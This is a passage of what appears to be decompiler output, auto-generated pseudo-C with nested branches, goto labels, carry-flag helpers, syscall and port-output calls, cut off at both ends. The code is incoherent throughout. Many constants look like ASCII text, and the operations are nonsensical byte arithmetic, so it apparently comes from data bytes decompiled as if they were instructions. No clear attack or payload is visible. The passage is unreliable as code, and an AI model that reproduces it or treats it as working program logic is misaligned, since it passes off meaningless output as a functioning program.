-4);\n                            *(puVar126 + -4) = uVar128;\n                            uVar122 = CONCAT11((piVar123 >> 8) + puVar114[0x60], piVar123);\n                            puVar40 = piVar123 & 0xffff0000 | uVar122;\n                            iVar23 = *((uVar118 - 1) + puVar19 * 2) * 0x62;\n                            *puVar46 = *puVar46 + uVar7;\n                            *(iVar23 + 0x48) = *(iVar23 + 0x48) + iVar23;\n                            puVar28 = iVar23 + 1;\n                            puVar47 = uVar118 - 2 ^ *(pcVar15 + 0x50);\n                            puVar120 = puVar114 ^ *puVar47;\n                            puVar36 = puVar46 ^ 0x34;\n                            uVar38 = uVar17 + 1;\n                            cVar49 = puVar36;\n                            *puVar36 = *puVar36 + cVar49;\n                            puVar16 = uVar17 + 0x11 + puVar47;\n                            uVar132 = *puVar16;\n                            cVar33 = puVar47 >> 8;\n                            *puVar16 = *puVar16 + cVar33;\n                            puVar63 = puVar126 + -8;\n                            *(puVar126 + -8) = in_DS;\n                            puVar26 = puVar120;\n                            if (!SCARRY1(uVar132, cVar33)) {\n                                uVar132 = *puVar36;\n                                if (!SCARRY1(cVar49, *puVar36)) {\n                                    *(puVar47 + 9) = *(puVar47 + 9) | uVar122 >> 8;\n                                    uVar17 = uVar38;\n                                }\n                                uVar38 = uVar17;\n                                *(iVar23 + 0x4e) = *(iVar23 + 0x4e) + puVar47;\n                                *(puVar126 + -0xc) = puVar28;\n                                uVar6 = 9 < (cVar49 + uVar132 & 0xf) | uVar6;\n                                pcVar15 = (puVar46 & 0xffff0000 |\n                                          CONCAT11((puVar46 >> 8) + uVar6, cVar49 + uVar132 + uVar6 * '\\x06') & 0xff0f)\n                                          ^ 0x43;\n                                puVar26 = puVar120 + -1;\n                                puVar40 = *(puVar126 + -7);\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *(puVar126 + -7) = 0x1b720474;\n                                *(puVar126 + -0xb) = in_CS;\n                                *(uVar38 + 0x2f) = *(uVar38 + 0x2f) + puVar28;\n                                *(puVar120 + 0x42) = *(puVar120 + 0x42) ^ puVar28;\n                                pcVar15 = *(puVar126 + -0xb);\n                                *(puVar126 + -0xb) = pcVar15;\n                                uVar132 = puVar47 + -1 ^ *(iVar23 + 0x33);\n                                uVar27 = puVar47 + -1 & 0xffffff00;\n                                puVar47 = uVar27 | uVar132;\n                                *pcVar15 = *pcVar15 + puVar40;\n                                puVar120 = uVar38 + 0x15;\n                                uVar122 = *puVar120;\n                                *puVar120 = *puVar120 + puVar26;\n                                puVar120 = puVar47 + 0xe;\n                                puVar114 = *puVar120;\n                                uVar17 = *puVar120;\n                                *puVar120 = (uVar17 - (puVar126 + -0xb)) - CARRY4(uVar122, puVar26);\n                                *puVar26 = (*puVar26 - (puVar40 >> 8)) -\n                                           (puVar114 < puVar126 + -0xb ||\n                                           uVar17 - (puVar126 + -0xb) < CARRY4(uVar122, puVar26));\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                uVar122 = pcVar15 ^ 0x52453045;\n                                uVar6 = 9 < (uVar122 & 0xf) | uVar6;\n                                uVar122 = uVar122 & 0xffff0000 |\n                                          CONCAT11((uVar122 >> 8) + uVar6, uVar122 + uVar6 * '\\x06') & 0xff0f;\n                                pcVar15 = uVar122 - 1;\n                                *(puVar126 + -0xf) = puVar47;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                bVar131 = CARRY1(*0x7011665, uVar132);\n                                *0x7011665 = *0x7011665 + uVar132;\n                                puVar120 = uVar38 + 0x75;\n                                bVar133 = *puVar120 < puVar126 + -0xf || *puVar120 - (puVar126 + -0xf) < bVar131;\n                                *puVar120 = (*puVar120 - (puVar126 + -0xf)) - bVar131;\n                                puVar16 = puVar124 + 0x1f;\n                                uVar132 = *puVar16;\n                                uVar8 = uVar27 >> 8;\n                                uVar7 = *puVar16 + uVar8;\n                                *puVar16 = uVar7 + bVar133;\n                                uVar122 = uVar122 + 0x67 + (CARRY1(uVar132, uVar8) || CARRY1(uVar7, bVar133));\n                                *(puVar126 + -0x12) = uVar38;\n                                uVar6 = 9 < (uVar122 & 0xf) | uVar6;\n                                puVar36 = uVar122 & 0xffff0000 |\n                                          CONCAT11((uVar122 >> 8) + uVar6, uVar122 + uVar6 * '\\x06') & 0xff0f;\n                                *(puVar126 + -0x16) = puVar19;\n                                puVar63 = puVar126 + -0x1a;\n                                *(puVar126 + -0x1a) = puVar36;\n                            }\n                            iVar37 = uVar38 - 1;\n                            uVar7 = puVar36;\n                            *puVar36 = *puVar36 + uVar7;\n                            uVar132 = *puVar47;\n                            uVar8 = puVar40;\n                            *puVar47 = *puVar47 + uVar8;\n                            puVar114 = puVar63;\n                            if (*puVar47 == 0) {\ncode_r0x00441cf6:\n                                puVar126 = puVar114;\n                                *puVar36 = *puVar36 + puVar36;\n                                puVar26 = puVar26 + 1;\n                                puVar47 = puVar47 + 1;\n                                puVar28 = puVar36 ^ 0x4a;\n                                *puVar28 = *puVar28 ^ puVar19;\n                                puVar36 = (puVar36 & 0xffffff00 | puVar28 & 0xff) ^ 0x35;\ncode_r0x00441d06:\n                                uVar132 = puVar36;\n                                bVar131 = CARRY1(*puVar36, uVar132);\n                                *puVar36 = *puVar36 + uVar132;\n                                if (bVar131) {\n                                    uVar7 = *puVar36;\n                                    *puVar36 = *puVar36 + uVar132;\n                                    puVar47 = puVar47 & 0xffffff00 |\n                                              (puVar47 - *(puVar124 + 0x2b)) - CARRY1(uVar7, uVar132);\n                                }\n                                else {\n                                    uVar7 = (uVar132 + 0x9e) - bVar131;\n                                    uVar122 = puVar36 & 0xffffff00;\n                                    uVar7 = uVar7 + *(uVar122 | uVar7) + (uVar132 < 0x62 || uVar132 + 0x9e < bVar131) +\n                                            10;\n                                    pcVar15 = uVar122 | uVar7;\n                                    out(*puVar26, puVar40);\n                                    *pcVar15 = *pcVar15 + uVar7;\n                                    *(puVar124 + 0x59) = *(puVar124 + 0x59) + uVar8;\n                                    uVar132 = *(puVar26 + 0x45);\n                                    *(puVar126 + -5) = pcVar15;\n                                    puVar47 = puVar47 + -1;\n                                    puVar40 = (puVar40 & 0xffffff00 | uVar8 ^ uVar132) - 1;\n                                    *pcVar15 = *pcVar15 + uVar7;\n                                    uVar132 = *puVar40;\n                                    *puVar40 = *puVar40 + puVar47;\n                                    puVar19 = *(puVar126 + -5);\n                                    uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                    uVar7 = uVar7 + uVar6 * '\\x06';\n                                    puVar36 = uVar122 | uVar7 + (0x90 < (uVar7 & 0xf0) |\n                                                                CARRY1(uVar132, puVar47) | uVar6 * (0xf9 < uVar7)) * '`'\n                                    ;\n                                    puVar126 = puVar126 + -1;\n                                    puVar26 = puVar26 + 1;\n                                }\n                                ppcVar119 = puVar36 + -0x2b20202b & 0xffffff5a & *(puVar36 + -0x2b20202b & 0xffffff5a);\n                                uVar7 = ppcVar119;\n                                *ppcVar119 = *ppcVar119 + uVar7;\n                                *(puVar26 + 0x36) = *(puVar26 + 0x36) + uVar7;\n                                *(puVar126 + -3) = puVar40;\n                                iVar37 = uVar38 - 2;\n                                *(puVar126 + -7) = ppcVar119;\n                                *(puVar126 + -0xb) = puVar47 + -1;\n                                puVar40 = *(puVar126 + -0xb);\n                                *(puVar126 + -0xb) = puVar126 + -7;\n                                *(puVar126 + -0xf) = puVar19;\n                                *ppcVar119 = *ppcVar119 + uVar7;\n                                uVar132 = *ppcVar119;\n                                *ppcVar119 = *ppcVar119 + uVar7;\n                                *ppcVar119 = *ppcVar119 + uVar7 + CARRY1(uVar132, uVar7);\n                                puVar26 = puVar26 & *puVar19;\n                                *ppcVar119 = ppcVar119 + *ppcVar119 + (ppcVar119 < 0x533a5634);\n                                *(puVar47 + 0x52) = *(puVar47 + 0x52) + iVar23;\n                                *(puVar126 + -0x14) = iVar23;\n                                puVar28 = iVar23 + -1;\n                                uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                puVar36 = (ppcVar119 & 0xffff0000 |\n                                          CONCAT11((ppcVar119 >> 8) + uVar6, uVar7 + uVar6 * '\\x06') & 0xff0f) - 1;\n                                ppuVar64 = puVar126 + -0x15;\n                                *puVar36 = *puVar36 + puVar36;\n                            }\n                            else {\n                                bVar131 = CARRY1(*puVar19, uVar7) || CARRY1(*puVar19 + uVar7, CARRY1(uVar132, uVar8));\n                                *puVar19 = *puVar19 + uVar7 + CARRY1(uVar132, uVar8);\n                                syscall();\n                                uVar132 = (uVar7 + 0x9c) - bVar131;\n                                puVar36 = puVar36 & 0xffffff00 | uVar132;\n                                ppuVar64 = puVar63 + -4;\n                                puVar126 = puVar63 + -4;\n                                *(puVar63 + -4) = in_CS;\n                                if (SBORROW1(uVar7, 'd') == SBORROW1(uVar7 + 0x9c, bVar131)) {\n                                    puVar114 = puVar63 + -4;\n                                    if (uVar132 == 0) goto code_r0x00441cf6;\n                                    goto code_r0x00441d06;\n                                }\n                            }\n                            ppcVar119 = puVar28 | *puVar28;\n                            puVar36 = puVar36 ^ 0x37355a2a;\n                            puVar36[0x59] = puVar36[0x59] + puVar40;\n                            uVar122 = iVar37 + 1;\n                            *(ppuVar64 + -4) = ppuVar64;\n                            puVar28 = puVar19 - 1;\n                            puVar16 = *(ppuVar64 + -4);\n                            *puVar28 = *puVar28 + puVar16;\n                            uVar132 = puVar36;\n                            uVar7 = puVar36 >> 8;\n                            if (puVar36 < 0x284b2872) {\n                                *(ppcVar119 + 0x55) = *(ppcVar119 + 0x55) + uVar132;\n                                puVar120 = puVar47 + -1;\n                                *(ppuVar64 + -4) = puVar16;\n                                *(ppcVar119 + 0x39) = *(ppcVar119 + 0x39) ^ ppcVar119;\n                                ppuVar65 = ppuVar64 + -5;\n                                ppcVar119 = ppcVar119 + -1;\n                                puVar46 = puVar47 + 0x76;\n                                uVar8 = CARRY1(*puVar46, uVar7);\n                                *puVar46 = *puVar46 + uVar7;\n                                ppuVar64 = ppuVar64 + -5;\n                                if (*puVar46 != 0) goto code_r0x00441d94;\ncode_r0x00441e02:\n                                ppuVar66 = ppuVar65 + -4;\n                                *(ppuVar65 + -4) = puVar120;\n                                uVar132 = puVar120 >> 8 & *puVar36;\n                                puVar120 = puVar120 & 0xffff0000 | CONCAT11(uVar132, puVar120);\n                                ppcVar30 = ppcVar119;\ncode_r0x00441e09:\n                                ppuVar67 = ppuVar66 + -4;\n                                *(ppuVar66 + -4) = puVar26;\n                                ppcVar119 = ppcVar30;\n                                if (uVar132 < '\\0') goto code_r0x00441e0c;\n                                puVar70 = ppuVar66 + -8;\n                                *(ppuVar66 + -8) = 0x5c;\n                            }\n                            else {\n                                uVar8 = 9 < (uVar132 & 0xf) | uVar6;\n                                puVar36 = puVar36 & 0xffff0000 | CONCAT11(uVar7 - uVar8, uVar132 + uVar8 * -6) & 0xff0f;\n                                puVar120 = puVar47;\n                                uVar6 = uVar8;\ncode_r0x00441d94:\n                                uVar8 = puVar36 + uVar8;\n                                puVar47 = puVar36 & 0xffffff00 | uVar8;\n                                *puVar47 = *puVar47 + uVar8;\n                                *puVar26 = *puVar26 ^ puVar26;\n                                *puVar47 = *puVar47 + uVar8;\n                                pcVar15 = *ppcVar119;\n                                *ppcVar119 = *ppcVar119 + ppcVar119;\n                                iVar23 = *ppuVar64;\n                                uVar122 = (puVar26 | *(puVar47 * 2 + 0x42)) ^\n                                          *(puVar16 & 0xffffff00 | puVar16 + *0x47273035 + CARRY4(pcVar15, ppcVar119));\n                                *ppuVar64 = uVar122;\n                                ppcVar119 = iVar23 + -1;\n                                puVar114 = uVar122 ^ *ppcVar119;\n                                *ppuVar64 = ppuVar64 + 1;\n                                *ppcVar119 = *ppcVar119 + uVar8;\n                                uVar122 = *ppuVar64;\n                                cVar33 = puVar120 >> 8;\n                                *puVar28 = *puVar28 - cVar33;\n                                *ppuVar64 = ppcVar119;\n                                puVar16 = *ppuVar64;\n                                *(iVar23 + 0x33) = *(iVar23 + 0x33) ^ ppcVar119;\n                                *ppuVar64 = puVar120;\n                                *(puVar47 * 2) = *(puVar47 * 2) ^ puVar114;\n                                uVar38 = puVar47 | *puVar47;\n                                cVar49 = uVar38 >> 8;\n                                *ppcVar119 = *ppcVar119 - cVar49;\n                                ppuVar64[-1] = ppcVar119;\n                                uVar6 = 9 < (uVar38 & 0xf) | uVar6;\n                                uVar11 = CONCAT11(cVar49 - uVar6, uVar38 + uVar6 * -6) & 0xff0f;\n                                *puVar120 = *puVar120 ^ uVar122;\n                                uVar132 = uVar11;\n                                uVar6 = 9 < uVar132 | uVar6;\n                                uVar132 = uVar132 + uVar6 * '\\x06';\n                                uVar132 = uVar132 + (0x90 < (uVar132 & 0xf0) | uVar6 * (0xf9 < uVar132)) * '`';\n                                pcVar15 = uVar38 & 0xffff0000 | uVar11 & 0xffffff00 | uVar132;\n                                puVar26 = puVar114 + 1;\n                                out(*puVar114, puVar16);\n                                *pcVar15 = *pcVar15 + uVar132;\n                                ppuVar64[-2] = pcVar15;\n                                ppuVar64[-3] = puVar120;\n                                uVar38 = pcVar15 + -1 ^ 0x42595048 ^ *(pcVar15 + -1 ^ 0x42595048);\n                                *puVar26 = *puVar26 + puVar120;\n                                *puVar28 = *puVar28 - cVar33;\n                                *puVar16 = *puVar16 & iVar23 + -2;\n                                uVar132 = *puVar16;\n                                uVar6 = 9 < (uVar38 & 0xf) | uVar6;\n                                uVar11 = CONCAT11((uVar38 >> 8) - uVar6, uVar38 + uVar6 * -6) & 0xff0f;\n                                ppuVar66 = ppuVar64 + -4;\n                                ppuVar64[-4] = puVar28;\n                                uVar7 = uVar11;\n                                uVar6 = 9 < uVar7 | uVar6;\n                                uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar7 + uVar6 * '\\x06') & 0xff0f;\n                                puVar36 = uVar38 & 0xffff0000 | uVar11;\n                                ppcVar30 = iVar23 + -2;\n                                if (uVar6) goto code_r0x00441e09;\n                                uVar132 = uVar11;\n                                *puVar36 = *puVar36 + uVar132;\n                                puVar16 = puVar16 + -1;\n                                ppuVar64[-5] = puVar16;\n                                uVar122 = uVar122 + 1;\n                                ppuVar64[-6] = puVar36;\n                                ppuVar65 = ppuVar64 + -7;\n                                ppuVar67 = ppuVar64 + -7;\n                                ppuVar64[-7] = puVar36;\n                                uVar6 = 9 < uVar132 | uVar6;\n                                uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                                puVar36 = uVar38 & 0xffff0000 | uVar11;\n                                *puVar36 = *puVar36 + uVar11;\n                                if (-1 < *puVar36) goto code_r0x00441e02;\ncode_r0x00441e0c:\n                                *puVar36 = *puVar36 + puVar36;\n                                *puVar36 = *puVar36 + puVar36;\n                                *(puVar120 + 0x15) = *(puVar120 + 0x15) ^ puVar36 ^ 0x4f;\n                                *(ppuVar67 + -4) = ppcVar119;\n                                *(ppuVar67 + -8) = puVar26;\n                                puVar16 = *(ppuVar67 + -8);\n                                puVar26 = puVar26 + 1;\n                                puVar36 = puVar36 ^ 0x4f ^ *(puVar120 + 0x51);\n                                uVar7 = puVar36;\n                                *puVar36 = *puVar36 + uVar7;\n                                uVar132 = *puVar36;\n                                *puVar36 = *puVar36 + uVar7;\n                                *(puVar16 + ppcVar119 * 2) =\n                                     puVar26 + CARRY1(uVar132, uVar7) + *(puVar16 + ppcVar119 * 2);\n                                *(ppuVar67 + -8) = puVar120;\n                                ppcVar68 = ppuVar67 + -8 & *0x7c142523;\n                                uVar122 = uVar122 - *0x3f283230;\n                                uVar7 = uVar7 + 0xbe;\n                                pcVar15 = puVar36 & 0xffffff00 | uVar7;\n                                ppcVar30 = ppcVar119;\n                                ppcVar69 = ppcVar68;\n                                if ((POPCOUNT(uVar7) & 1U) == 0) {\n                                    *pcVar15 = *pcVar15 + uVar7;\n                                    *pcVar15 = *pcVar15 + uVar7;\n                                    iVar23 = *ppcVar68;\n                                    *ppcVar68 = ppcVar119;\n                                    puVar26 = puVar26 ^ *ppcVar119;\n                                    ppcVar69 = ppcVar68 + -1;\n                                    ppcVar68[-1] = ppcVar119;\n                                    puVar16 = iVar23 + -1;\n                                    puVar120 = puVar120 + 1;\n                                    ppcVar68[-2] = puVar28;\n                                    pcVar15 = ppcVar68[-2];\n                                    ppcVar30 = ppcVar119 + -1;\n                                    *(ppcVar119 + 0x37) = *(ppcVar119 + 0x37) ^ pcVar15;\n                                    puVar28 = puVar19;\n                                }\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *(ppcVar69 + -4) = puVar26;\n                                *(ppcVar69 + -8) = puVar16;\n                                uVar132 = pcVar15 & 0x4e2a5b29;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                uVar11 = CONCAT11(((pcVar15 & 0x4e2a5b29) >> 8) + uVar6, uVar132 + uVar6 * '\\x06') &\n                                         0xff0f;\n                                pcVar15 = pcVar15 & 0x4e2a0000 | uVar11;\n                                *(ppcVar69 + -0xc) = puVar28;\n                                uVar132 = uVar11;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                uVar128 = *(ppcVar69 + -0xc);\n                                uVar6 = 9 < uVar132 | uVar6;\n                                puVar70 = *(ppcVar69 + -8) + 4;\n                            }\n                            *0x26372143 = *0x26372143 - (ppcVar30 >> 8);\n                            out(*puVar26, puVar16);\n                            *(puVar70 + -4) = puVar26 + 1;\n                            *(puVar70 + -8) = puVar28;\n                            uVar8 = puVar120 ^ *(ppcVar30 + 0x59);\n                            piVar123 = puVar120 & 0xffffff00 | uVar8;\n                            *(puVar70 + -0xc) = uVar122;\n                            *(puVar70 + -0xf) = puVar16;\n                            uVar39 = *(puVar70 + -0xe);\n                            puVar20 = *(puVar70 + -10) + -1;\n                            *(puVar70 + -10) = uVar122;\n                            uVar7 = puVar20;\n                            *puVar20 = *puVar20 + uVar7;\n                            *puVar20 = *puVar20 + uVar7;\n                            *(puVar70 + -0xe) = puVar20;\n                            *(puVar70 + -0x12) = ppcVar30 + -1;\n                            *(puVar70 + -0x16) = puVar16;\n                            *(puVar70 + -0x1a) = piVar123;\n                            *(puVar70 + -0x1e) = puVar70 + -10;\n                            *(puVar70 + -0x22) = uVar122;\n                            *(puVar70 + -0x26) = puVar26 + 1;\n                            *(puVar70 + -0x2a) = puVar28 - 1;\n                            *(uVar122 + 0x3c) = *(uVar122 + 0x3c) & piVar123;\n                            *(puVar70 + -0x2e) = 0x56232b04;\n                            pshufw(fVar136 >> 0x10, *puVar20, 0x35);\n                            *(puVar70 + -0x32) = puVar16;\n                            puVar36 = puVar16 + -2;\n                            uVar132 = 9 < (uVar7 & 0xf) | 9 < (uVar39 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((puVar20 >> 8) - uVar132, uVar7 + uVar132 * -6) & 0xff0f;\n                            uVar6 = uVar11;\n                            uVar7 = uVar6 - 0x21;\n                            uVar132 = 9 < (uVar7 & 0xf) | uVar132;\n                            uVar7 = uVar7 + uVar132 * '\\x06';\n                            out(*(puVar26 + 3 ^ *0x5e710050), puVar36);\n                            iVar23 = *piVar123;\n                            *piVar123 = puVar70 + *piVar123 + -0x32;\n                            *(puVar70 + -0x36) =\n                                 puVar20 & 0xffff0000 | uVar11 & 0xffffff00 |\n                                 uVar7 + (0x90 < (uVar7 & 0xf0) | uVar6 < 0x21 | uVar132 * (0xf9 < uVar7)) * '`';\n                            if (SCARRY4(iVar23, puVar70 + -0x32)) {\n                                puVar36 = *(puVar70 + -0x36);\n                                pcVar15 = *(puVar70 + -0x32);\n                                iVar23 = *(puVar70 + -0x2e);\n                                piVar123 = *(puVar70 + -0x26);\n                                piVar41 = *(puVar70 + -0x22);\n                                puVar26 = *(puVar70 + -0x1e);\n                                puVar16 = *(puVar70 + -0x1a);\n                                ppiVar71 = puVar70 + -0x16;\ncode_r0x00441f36:\n                                *puVar16 = *puVar16 + puVar16;\n                                puVar16[0x31] = puVar16[0x31] ^ puVar26;\n                                piVar21 = *ppiVar71;\n                                ppuVar72 = ppiVar71 + 1;\n                                puVar19 = puVar26 + 1;\n                                *piVar21 = *piVar21 + piVar21;\n                                piVar41 = piVar41 + -1 | *puVar19;\n                                puVar16 = puVar36 + 0x7b;\n                                uVar6 = *puVar16;\n                                uVar7 = piVar41 >> 8;\n                                *puVar16 = *puVar16 + uVar7;\n                                pcVar45 = piVar21 + CARRY1(uVar6, uVar7) + *piVar21;\n                                pcVar18 = ppiVar71 + pcVar45 * 2 + 0x5d;\n                                *pcVar18 = *pcVar18 + puVar19;\n                                puVar16 = pcVar45 ^ puVar26[0xd];\n                                *puVar16 = *puVar16 + puVar16;\n                                uVar7 = *puVar16;\ncode_r0x00441f50:\n                                if (uVar7 != 0) {\ncode_r0x00441f52:\n                                    *ppuVar72 = *ppuVar72;\n                                    iVar37 = *piVar41;\n                                    uVar122 = piVar41 & 0xffff0000 | CONCAT11(piVar41 >> 8 | *puVar36, piVar41);\n                                    ppcVar119 = uVar122 - 1;\n                                    pcVar15 = pcVar15 + -1;\n                                    *puVar36 = *puVar36 ^ ppcVar119;\n                                    *ppcVar119 = *ppcVar119 + pcVar15;\n                                    ppuVar73 = ppuVar72 + -1;\n                                    ppuVar72[-1] = iVar23;\n                                    ppuVar72[-2] = piVar123;\n                                    piVar41 = uVar122 - 2;\n                                    uVar122 = ppuVar72[-2];\n                                    puVar19 = puVar19 + iVar37 + 1;\n                                    uVar132 = 9 < (uVar122 & 0xf) | uVar132;\n                                    uVar11 = CONCAT11((uVar122 >> 8) + uVar132, uVar122 + uVar132 * '\\x06') & 0xff0f;\n                                    puVar16 = uVar122 & 0xffff0000 | uVar11;\n                                    uVar6 = *puVar16;\n                                    uVar7 = uVar11;\n                                    *puVar16 = *puVar16 + uVar7;\n                                    bVar131 = false;\n                                    piVar123 = piVar123 ^\n                                               *((uVar122 & 0xffff0000 |\n                                                 CONCAT11(uVar11 >> 8 & *puVar19, uVar7 + 0x31 + CARRY1(uVar6, uVar7)))\n                                                + 0x5f);\n                                    goto code_r0x00441f81;\n                                }\n                            }\n                            else {\n                                *puVar36 = *puVar36 + (puVar36 >> 8);\n                                *(puVar16 + 0x46) = *(puVar16 + 0x46) ^ puVar36;\n                                puVar46 = *(puVar70 + -0x36);\n                                uVar38 = *(puVar70 + -0x32);\n                                *(puVar70 + -0x31) = uVar122;\n                                puVar36 = puVar28 - 3;\n                                iVar23 = uVar122 + 1;\n                                *puVar36 = *puVar36 ^ (puVar120 & 0xffffff00) >> 8;\n                                uVar7 = (uVar38 ^ 0x1400444a) + (*puVar46 < ppcVar30 + -1);\n                                uVar38 = (uVar38 ^ 0x1400444a) & 0xffffff00;\n                                puVar16 = uVar38 | uVar7;\n                                *puVar16 = *puVar16 + uVar7;\n                                *(puVar70 + -0x35) = iVar23;\n                                uVar39 = *(puVar70 + -0x35);\n                                *(puVar70 + -0x35) = puVar70 + -0x31;\n                                *(puVar70 + -0x39) = puVar16;\n                                *(puVar16 * 2) = *(puVar16 * 2) ^ puVar46 >> 8;\n                                uVar6 = *puVar16;\n                                *puVar16 = *puVar16 + uVar7;\n                                pcVar15 = *(puVar70 + -0x39);\n                                uVar17 = puVar46 + 1 & 0xffffff00;\n                                piVar41 = uVar17 | (puVar46 + 1 | *0x2f6b5d13);\n                                *(puVar70 + -0x39) = puVar70 + -0x35;\n                                *(piVar123 + 0x47) = *(piVar123 + 0x47) + uVar39 + -1;\n                                uVar38 = (uVar38 | (uVar7 - 0x28) - CARRY1(uVar6, uVar7)) - 1;\n                                uVar132 = 9 < (uVar38 & 0xf) | uVar132;\n                                puVar16 = uVar38 & 0xffff0000 |\n                                          CONCAT11((uVar38 >> 8) + uVar132, uVar38 + uVar132 * '\\x06') & 0xff0f;\n                                *puVar16 = *puVar16 ^ uVar17 >> 8;\n                                puVar16 = puVar16 ^ 0x424b335a;\n                                *(piVar123 + 0x56) = *(piVar123 + 0x56) ^ puVar16;\n                                puVar19 = *(puVar70 + -0x39);\n                                *(puVar70 + -0x39) = puVar36;\n                                *0x693a2658 = *0x693a2658 + uVar8;\n                                *(uVar122 + 0x3a) = *(uVar122 + 0x3a) + puVar19;\n                                *(puVar70 + -0x3d) = piVar41;\n                                *(puVar70 + -0x41) = piVar41;\n                                *(puVar70 + -0x45) = piVar123;\n                                ppuVar72 = puVar70 + -0x49;\n                                ppiVar71 = puVar70 + -0x49;\n                                ppuVar73 = puVar70 + -0x49;\n                                *(puVar70 + -0x49) = puVar36;\n                                uVar8 = puVar16;\n                                bVar131 = CARRY1(*puVar16, uVar8);\n                                uVar6 = *puVar16;\n                                *puVar16 = *puVar16 + uVar8;\n                                uVar7 = *puVar16;\n                                if (*puVar16 < '\\0') {\n                                    ppuVar72 = puVar70 + -0x4d;\n                                    *(puVar70 + -0x4d) = iVar23;\n                                    goto code_r0x00441f52;\n                                }\n                                if (*puVar16 < '\\0') goto code_r0x00441f50;\n                                puVar26 = puVar19;\n                                if (!SCARRY1(uVar6, uVar8)) goto code_r0x00441f36;\ncode_r0x00441f81:\n                                uVar122 = piVar41 & 0xffff0000 |\n                                          CONCAT11(((piVar41 >> 8) - *pcVar15) - bVar131, piVar41);\n                                pcVar18 = *ppuVar73;\n                                uVar6 = pcVar18;\n                                *pcVar18 = *pcVar18 + uVar6;\n                                pcVar15 = uVar122 + 0x54;\n                                *pcVar15 = *pcVar15 + uVar6;\n                                *ppuVar73 = pcVar18;\n                                ppuVar73[-1] = uVar122;\n                                iVar37 = ppuVar73[-1];\n                                uVar132 = 9 < (uVar6 & 0xf) | uVar132;\n                                uVar11 = CONCAT11((pcVar18 >> 8) + uVar132, uVar6 + uVar132 * '\\x06') & 0xff0f;\n                                pcVar15 = pcVar18 & 0xffff0000 | uVar11;\n                                *(piVar123 + 0x36) = *(piVar123 + 0x36) ^ puVar19;\n                                cVar49 = uVar11;\n                                *pcVar15 = *pcVar15 + cVar49;\n                                *(puVar19 + 8) = *(puVar19 + 8) + cVar49;\n                                puVar19 = *ppuVar73;\n                                pcVar15 = ppuVar73[1];\n                                piVar41 = iVar37 + 1;\n                                *piVar41 = *piVar41 + piVar123;\n                                ppuVar72 = ppuVar73 + 3;\n                                uVar122 = ppuVar73[2] & *ppuVar73[2];\n                                uVar6 = piVar41 ^ *(puVar19 + 0x35);\n                                uVar132 = 9 < (uVar122 & 0xf) | uVar132;\n                                piVar123 = piVar123 + -1;\n                                piVar41 = piVar41 & 0xffff0000 |\n                                          CONCAT11((piVar41 & 0xffffff00) >> 8 ^ *((piVar41 & 0xffffff00 | uVar6) * 3), \n                                                   uVar6);\n                                puVar16 = (uVar122 & 0xffff0000 |\n                                          CONCAT11((uVar122 >> 8) + uVar132, uVar122 + uVar132 * '\\x06') & 0xff0f) ^\n                                          0x4f;\n                            }\n                            *0x383f225b = *0x383f225b + puVar16;\n                            *(ppuVar72 + -4) = pcVar15;\n                            *piVar41 = *piVar41 - ((puVar16 ^ 0xf42273f) >> 8);\n                            puVar36[0x34] = puVar36[0x34] + piVar41;\n                            *(ppuVar72 + -9) = pcVar15;\n                            *(ppuVar72 + -0xd) = pcVar15;\n                            uVar122 = puVar16 ^ 0xf42273f ^ *(puVar36 + 0x59);\n                            *(ppuVar72 + -0x11) = piVar123;\n                            uVar8 = puVar19 ^ puVar36[0x47];\n                            cVar49 = (puVar19 & 0xffffff00) >> 8;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            pcVar48 = *(ppuVar72 + -0x11);\n                            uVar132 = 9 < (uVar122 & 0xf) | uVar132;\n                            *(ppuVar72 + -0x11) = pcVar15;\n                            uVar122 = (uVar122 & 0xffff0000 |\n                                      CONCAT11((uVar122 >> 8) + uVar132, uVar122 + uVar132 * '\\x06') & 0xff0f) ^\n                                      0x295a2820;\n                            *puVar36 = *puVar36 ^ pcVar48 >> 8;\n                            *(ppuVar72 + -0x15) = puVar36;\n                            iVar74 = *(ppuVar72 + -0x15);\n                            piVar123 = (puVar19 & 0xffffff00 | uVar8) + 0x2f;\n                            *piVar123 = *piVar123 - pcVar48;\n                            uVar132 = 9 < (uVar122 & 0xf) | uVar132;\n                            uVar11 = CONCAT11((uVar122 >> 8) - uVar132, uVar122 + uVar132 * -6) & 0xff0f;\n                            iVar37 = -*(pcVar15 + puVar36);\n                            uVar6 = uVar11;\n                            uVar132 = 9 < uVar6 | uVar132;\n                            uVar11 = CONCAT11((uVar11 >> 8) - uVar132, uVar6 + uVar132 * -6) & 0xff0f;\n                            pcVar18 = uVar122 & 0xffff0000 | uVar11;\n                            uVar122 = CONCAT11(cVar49 - *0x53512c35, uVar8);\n                            uVar38 = puVar19 & 0xffff0000 | uVar122;\n                            cVar49 = uVar11;\n                            *pcVar18 = *pcVar18 + cVar49;\n                            *pcVar18 = *pcVar18 + cVar49;\n                            uVar39 = *(iVar74 + iVar37 + 5);\n                            *(piVar41 + 0x53) = *(piVar41 + 0x53) ^ uVar38;\n                            *(iVar74 + iVar37 + 5) = uVar39;\n                            uVar27 = pcVar15 ^ *0x5945334a;\n                            pcVar15 = *(iVar74 + iVar37 + 5);\n                            *(iVar74 + iVar37 + 5) = piVar41;\n                            *(iVar74 + iVar37 + 1) = puVar36 + 2;\n                            *(iVar74 + iVar37 + -3) = uVar38 - 1;\n                            *(iVar74 + iVar37 + -7) = piVar41;\n                            pcVar45 = piVar41 + -1;\n                            cVar49 = pcVar15;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *(iVar74 + iVar37 + -0xb) = in_DS;\n                            *(uVar38 + 0x26) = *(uVar38 + 0x26) & uVar38 - 1;\n                            iVar75 = *(iVar74 + iVar37 + -0xb);\n                            uVar6 = cVar49 + *pcVar48;\n                            pcVar18 = pcVar15 & 0xffffff00 | uVar6;\n                            *pcVar18 = 